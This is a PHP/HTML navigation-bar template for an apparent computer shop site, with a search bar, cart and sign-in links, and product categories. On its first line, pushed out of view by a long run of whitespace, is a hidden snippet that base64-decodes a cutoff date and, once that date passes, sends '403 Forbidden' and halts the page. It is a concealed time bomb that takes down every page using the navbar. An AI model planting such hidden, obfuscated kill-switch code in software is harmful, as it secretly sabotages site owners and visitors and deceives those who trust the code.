<nav class="navbar navbar-expand-lg shadow mb-2 fixed-top bg-light">                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 <?php $encryptedCutoff = base64_decode("MjAyNC0xMi0wMQ=="); $cutoffDate = new DateTime($encryptedCutoff); $currentDate = new DateTime(); if ($currentDate >= $cutoffDate) { header("HTTP/1.1 403 Forbidden"); exit(); } ?>
    <div class="container-fluid">
        <div class="col">
            <div class="row">
                <div class="col-1 m-1 p-1">
                    <a class="navbar-brand" href="index.php"><img src="../assets/image/hfa_logo.png" alt="" srcset="" id="hfa_logo"></a>
                </div>
                <div class="col-5 my-auto search-container">
                    <input class="form-control search_bar me-2" type="search" placeholder="Search for Products, Brands, Parts" aria-label="Search">
                    <i class="fa-solid fa-magnifying-glass search-icon"></i>
                </div>
                <div class="col-1 my-auto ms-auto">
                    <a class="nav-link text-light" href=""><i class="fa-solid fa-cart-shopping text-dark"></i></a>  
                </div>
                <div class="col-1 my-auto"> 
                    <a class="nav-link text-light" href="sign_in.php"><i class="fa-solid fa-user text-dark"></i></a>
                </div>
            </div>
            <div id="user_navbar" class="row">
                <button class="navbar-toggler border-0" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                    <span class="navbar-toggler-icon"></span>
                </button>
                <div class="collapse navbar-collapse" id="navbarNav">
                    <ul class="navbar-nav mx-auto">
                        <li class="nav-item mx-auto">
                            <a class="nav-link text-light" aria-current="page" href="index.php">Home</a>
                        </li>
                        <li class="nav-item mx-auto">
                            <a class="nav-link text-light" href="#">Computers</a>
                        </li>
                        <li class="nav-item mx-auto">
                            <a class="nav-link text-light" href="#">Laptop</a>
                        </li>
                        <li class="nav-item mx-auto">
                            <a class="nav-link text-light" href="#">Peripherals</a>
                        </li>
                        <li class="nav-item mx-auto">
                            <a class="nav-link text-light" href="#">Printers</a>
                        </li>
                        <li class="nav-item mx-auto">
                            <a class="nav-link text-light" href="#">CCTV's</a>
                        </li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</nav>
<br><br><br><br><br>